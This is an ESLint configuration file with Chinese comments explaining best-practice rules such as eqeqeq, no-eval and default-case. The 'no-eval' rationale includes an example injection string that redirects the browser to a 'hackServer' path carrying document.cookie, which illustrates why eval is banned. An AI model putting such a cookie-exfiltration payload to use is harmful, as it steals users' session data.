module.exports = {
  rules: {
    /**
     * @meaning
     * 数组内置方法中回调函数需要返回值的函数体中必须包含return
     * 允许单return语法（allowImplicit: true）
     * @why
     * 统一规范,防止map等函数忘了写return而导致的问题，
     * 如果只是想遍历不需要返回值的话，使用`forEach`方法。
     * @wrong
     * list.map(e => console.log(e));
     * @right
     * list.map(e => e + 'abc');
     * @group
     * 数组
     */
    'array-callback-return': ['error', { allowImplicit: true }],

    /**
     * @meaning
     * 类中的方法必须使用this
     * 或者把它变成static函数或提取出模块
     * @why
     * 让你精简类，把和实例不关联的方法移出类（提取出模块等）
     * 另一种相反的观点是：我需要在类中提供一些公共帮助方法，供
     * 多个类方法使用。而且继承的时候可以更好的重用。
     * @wrong
     * class A {
     *   method() { console.log('method')}
     * }
     * @right
     * class A {
     *   static method() { console.log('method')}
     *   methodB() {console.log(this.name)}
     *
     * }
     * @group
     * 类
     */
    'class-methods-use-this': [
      'error',
      {
        exceptMethods: [],
      },
    ],

    /**
     * @meaning
     * 函数的return语句统一形式：如果有`return`语句，那么要求每一个分支出口都有`return`语句
     * 且每个return语句的形式统一成两者之一：`return value`或者`return`
     * 忽略首字母大写的函数(这种函数认为是类)
     * @why
     * 1. 统一规范return形式，看到return就知道是函数出口，增强可读性
     * 2. 防止在写某个条件时候因为忘了写return而导致意外错误
     * @wrong
     * // 有出口没有return
     * function a() {
     *  if (xx) {
     *    return
     *  }
     * }
     * // return形式不统一
     * function b() {
     *  if (xx) {
     *    return
     *  }
     *  return true;
     * }
     * @right
     * function b() {
     *  if (xx) {
     *    return true
     *  }
     *  return false;
     * }
     * // 首字母大写，是类，忽略
     * function Foo() {
     *   // 安全构造函数，防止不使用new直接调用Foo时候this指向错误
     *   if (!(this instanceof Foo)) {
     *     return new Foo();
     *   }
     *   this.a = 0;
     * }
     * @group
     * 函数
     */
    'consistent-return': 'error',

    /**
     * @meaning
     * switch语句强制要求default块
     * 如果没有default行为，加上注释`//no default`跳过规则
     * @why
     * 通过明确要求写default语句，让开发人员意识到，
     * 功能是否有默认行为而自己忘了写
     * @wrong
     * switch (a) {
     *  case 1:
     *     break;
     * }
     * @right
     * switch (a) {
     *  case 1:
     *     break;
     *  default:
     *     somecode;
     *     break;
     * }
     * // 注释明确告诉没有default
     * switch (a) {
     *  case 1:
     *     break;
     *  // no default
     * }
     * @group
     * 条件判断
     */
    'default-case': ['error', { commentPattern: '^no default$' }],

    /**
     * @meaning
     * 直接访问对象属性(属性名无需动态表示)时必须使用`.`来访问
     * @why
     * 更易阅读，更简洁
     * @wrong
     * obj['name']
     * @right
     * obj.name
     * @group
     * 对象
     */
    'dot-notation': ['error', { allowKeywords: true }],

    /**
     * @meaning
     * 强制使用 === 和 !== 比较值是否相等
     * @why
     * == 和 !==会对不同类型进行转换后比较，
     * 防止意外的隐式转换造成的错误。
     * 转换规则https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness#Loose_equality_using
     * ==的比较规则：
     * * 同类型
     *  执行 ===
     *  NaN和自己不相等
     * * 不同类型
     *  null == undefined
     *  原始类型往number转换然后比较
     *  对象类型通过toString成原始类型然后比较
     * @wrong
     * if (a == b) {}
     * @right
     * if (a === b) {}
     * @group
     * 比较符号
     */
    eqeqeq: ['error', 'always'],

    /**
     * @meaning
     * 不允许使用`alert`,`confirm`和`prompt`
     * @why
     * 这几个ui不好看，而且会阻塞js进程
     * @wrong
     * alert('abcd')
     * @right
     * customAlert('abcd')
     * @group
     * 最佳实践
     */
    'no-alert': 'warn',

    /**
     * @meaning
     * 不允许使用arguments.caller 或 arguments.callee
     * @why
     * 会导致部分情况下代码无法被引擎优化
     * 以后版本会被被es规范弃用
     * @wrong
     * @right
     * @group
     * 函数
     */
    'no-caller': 'error',

    /**
     * @meaning
     * 不允许在switch语句中使用变量声明语句(const,let,function,class)
     * 如果使用的话，用{}包含case中的代码块
     * @why
     * const,let,class和function公用一个作用域。可能导致意外的错误
     * @wrong
     *  switch (1) {
     *    case 0:
     *      const x = 1234;
     *      break;
     *    case 1:
     *      const x = 1234;
     *      break;
     * }
     *  switch (1) {
     *    case 0:
     *      function y() {}
     *      break;
     *    case 1:
     *      y();
     *      break;
     * }
     * @right
     *  switch (1) {
     *    case 0: {
     *      const x = 1234;
     *      break;
     *    }
     *    case 1: {
     *      const x = 1234;
     *      break;
     *    }
     * }
     * @group
     * 条件判断
     */
    'no-case-declarations': 'error',

    /**
     * @meaning
     * 禁止定义没有执行语句的空函数
     * 允许箭头函数是空函数
     * @why
     * 空函数增加读代码的成本：需要猜测写的人是有什么特殊含义还是仅仅是写错了
     * @wrong
     * function foo() {}
     * @right
     * function foo() {
     *  // 默认函数防止报错
     * }
     * const foo = () => {}
     * @group
     * 函数
     */
    'no-empty-function': [
      'error',
      {
        allow: ['arrowFunctions'],
      },
    ],

    /**
     * @meaning
     * 不允出现空解构
     * @why
     * @wrong
     * const {a: {}} = foo;
     * @right
     * @group
     */
    'no-empty-pattern': 'error',

    /**
     * @meaning
     * 不允许使用eval
     * @why
     * 1. eval的字符串有js注入的风险：比如让用户输入四则运算eval('3 + 4')，但是黑客输入js代码:eval('window.location = /hackServer/?cookie=document.cookie')
     * 2. 无法debug eval中的代码
     * @wrong
     * @right
     * @group
     * 最佳实践
     */
    'no-eval': 'error',

    /**
     * @meaning
     * 禁止拓展原生对象
     * @why
     * 防止有人改变原生的方法，而其他人不知道，导致错误的使用方法
     * @wrong
     * Object.prototype.a = "a";
     * Array.prototype.a = "a";
     * @right
     * @group
     * 对象
     */
    'no-extend-native': 'error',

    /**
     * @meaning
     * 禁止无效bind（无this,箭头函数,函数体是自执行语句)
     * 插件只能检测出函数定义后紧跟bind的语法（`const y = (function() {}).bind()` `变量.bind()`的语法无法检测到，请自己注意)
     * @why
     * 箭头函数this无法改变
     * 无this函数不要用bind
     * 自执行函数的this无法绑定
     * @wrong
     * @right
     * @group
     * 函数
     */
    'no-extra-bind': 'error',

    /**
     * @meaning
     * switch中每个case必须有对应break
     * @why
     * 防止因为忘记写break导致额外执行了不满足条件的case代码段
     * @wrong
     * case 1:
     *  dosomething();
     * case 2:
     *  dosomething();
     * @right
     * case 1:
     *  dosomething();
     *  break;
     * case 2:
     *  dosomething();
     *  break;
     * @group
     * 条件判断
     */
    'no-fallthrough': 'error',

    /**
     * @meaning
     * 禁止重新分配只读全局对象的引用
     * @why
     * @wrong
     * @right
     * @group
     * 最佳实践
     */
    'no-global-assign': ['error', { exceptions: [] }],

    /**
     * @meaning
     * 不允许隐式使用eval（settimeout参数传字符串）
     * @why
     * 理由同no-eval
     * @wrong
     * setTimeout("alert('Hi!');", 100);
     * @right
     * setTimeout(function() {
     *     alert("Hi!");
     * }, 100);
     * @group
     */
    'no-implied-eval': 'error',

    /**
     * @meaning
     * 不允许使用 `__iterator__`属性
     * @why
     * 这个属性是SpiderMonkey拓展所使用的预留属性
     * @wrong
     * @right
     * @group
     */
    'no-iterator': 'error',

    /**
     * @meaning
     * 不允许在switch和循环中使用标签
     * @why
     * label是弃用语法
     * @wrong
     * @right
     * @group
     */
    'no-labels': 'error',

    /**
     * @meaning
     * 禁止出现重复的`{}`
     * @why
     * 消除混淆
     * @wrong
     * @right
     * @group
     */
    'no-lone-blocks': 'error',

    // 不允许在循环中创建函数
    /**
     * @meaning
     * 不允许在循环中创建函数
     * @why
     * 创建函数就是创建闭包，防止错误引用变量或造成内存溢出
     *
     * @wrong
     * // 共享上下文环境，都输出10
     * for (var i = 0; i < 10; i++) {
     *    funcs[i] = function() {
     *        return i;
     *    };
     *}
     * @right
     * var a = function() {};
     * for (var i=10; i; i--) {
     *     a();
     * }
     * 函数没有记住外层的变量引用
     * for (var i=10; i; i--) {
     *     var a = function() {};
     *     a();
     * }
     * // 可以，引用的是块作用域变量
     * for (let i=10; i; i--) {
     *     var a = function() { return i; };
     *     a();
     * }
     * // 可以，函数保存的引用是外层不变的变量
     * var foo = 100;
     * for (let i=10; i; i--) {
     *     var a = function() { return foo; };
     *     a();
     * }
     * @group
     */
    'no-loop-func': 'error',

    // 禁止使用多行字符串，字符串中使用转义换行符：\\n
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-multi-str': 'error',

    // 禁止直接在语法中出现非赋值的new运算符：(const a = new Person()可以，不能直接new Person())
    // 一般new的对象都要返回，如果只new不返回使用，有可能是写错了，造成意外错误
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-new': 'error',

    // 不允许使用new操作符创建函数(通过解析字符串创建函数，一般也就模板引擎这么干)
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-new-func': 'error',

    // 禁止使用包装器对象创建string，number，boolean类型
    // 首先明确，stirng，number，boolean是原始类型，不是对象，但是他们为什么有
    // 类似'str'.toUppserCase()的方法呢，因为在读取值的时候，幕后使用包装器对象String('str')
    // 把它转换成对象以使用String类的全部方法，使用完成后，将丢弃包装器对象。
    // 那么用包装器对象有什么问题呢
    // 1. 使用包装器对象返回的是对象，不是原始类型
    // 1. const str = new String('str'); typeof str //'object'
    // 2. 使用包装器对象创建bool值，永远是true
    // 2. if (new Boolean(fasle)) { //执行}
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-new-wrappers': 'error',

    // 禁止八进制形式的数字
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-octal': 'error',

    // 禁止八进制字符串中的转义字符
    // var foo = 'Copyright \251';
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-octal-escape': 'error',

    // 禁止重新分配，操作函数参数
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-param-reassign': [
      'error',
      {
        props: true,
        ignorePropertyModificationsFor: [
          // for reduce accumulators
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'acc',
          // for reduce accumulators
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'accumulator',
          // for e.returnvalue
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'e',
          // for Koa routing
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'ctx',
          // for Express requests
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'req',
          // for Express requests
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'request',
          // for Express responses
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'res',
          // for Express responses
          /**
           * @meaning
           * @why
           * @wrong
           * @right
           * @group
           */
          'response',
        ],
      },
    ],

    // 禁止使用__proto__属性，这个属性指向一个对象的原型对象
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-proto': 'error',

    // 不允许重复声明一个变量
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-redeclare': 'error',

    // 禁止使用特定对象的特定属性
    // 1. 禁止使用arguments.callee
    // 2. 禁止使用全局对象（global，self，window）的isFinite，(使用Number.isFinite，因为全局的isFinite会转换成数字后判断)
    // 3. 禁止使用全局对象（同上）的isNaN，(请使用Number.isNaN，因为全局的isFinite会转换成数字后判断)
    // 4. 禁止使用对象的__defineGetter__和__defineSetter__方法，使用Object.definePropery代替
    // 5. 禁止使用Math.pow。幂运算，使用**代替
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-restricted-properties': [
      'error',
      {
        object: 'arguments',
        property: 'callee',
        message: 'arguments.callee is deprecated',
      },
      {
        object: 'global',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'self',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'window',
        property: 'isFinite',
        message: 'Please use Number.isFinite instead',
      },
      {
        object: 'global',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        object: 'self',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        object: 'window',
        property: 'isNaN',
        message: 'Please use Number.isNaN instead',
      },
      {
        property: '__defineGetter__',
        message: 'Please use Object.defineProperty instead.',
      },
      {
        property: '__defineSetter__',
        message: 'Please use Object.defineProperty instead.',
      },
      {
        object: 'Math',
        property: 'pow',
        message: 'Use the exponentiation operator (**) instead.',
      },
    ],

    // 在return语句中禁止执行赋值语法
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-return-assign': ['error', 'always'],

    // 禁止在return中使用await语法
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-return-await': 'error',

    // 禁止在url中使用JavaScript脚本。ex：location.href = "javascript:void(0)";
    // 安全性问题
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-script-url': 'error',

    // 禁止自我分配
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-self-assign': [
      'error',
      {
        props: false,
      },
    ],

    // 禁止自己和自己比较
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-self-compare': 'error',

    // 禁止使用逗号运算符
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-sequences': 'error',

    // throw只允许throw error对象
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-throw-literal': 'error',

    // 禁止出现独立的表达式，包含短路、三目、模板字符（表达式结果没有赋值，有可能会修改变量，造成副作用）
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-unused-expressions': [
      'error',
      {
        allowShortCircuit: false,
        allowTernary: false,
        allowTaggedTemplates: false,
      },
    ],

    // 禁止无效的字符串连接('a' + 'b' => 'ab')
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-concat': 'error',

    // 禁止出现无效的转义符号（'a\b'）
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-escape': 'error',

    // 禁止出现return后面什么都不带（要不return具体值，要不别写return）
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-useless-return': 'error',

    // 禁止使用void运算符
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-void': 'error',

    // 禁止使用with语法
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'no-with': 'error',

    // promise reject的必须使用error对象或自定义对象
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    'prefer-promise-reject-errors': ['error', { allowEmptyReject: true }],

    // parseInt函数必须提供第二个参数-进制基数。
    // 因为parseInt会根据输入自动检测是属于哪个进制，这可能会造成
    // 和意图不符合的意外错误，比如：
    // var num = parseInt("071");      // 57
    // var num = parseInt("071", 10);  // 71
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    radix: 'error',

    // 要求条件判断语句中先出现变量，后出现常量
    // good：if (color === 'red')
    // bad：if ('red' === 'color')
    // 名字来源于星球大战中的尤达大师，说话
    // 喜欢这样反着来
    /**
     * @meaning
     * @why
     * @wrong
     * @right
     * @group
     */
    yoda: 'error',
  },
};
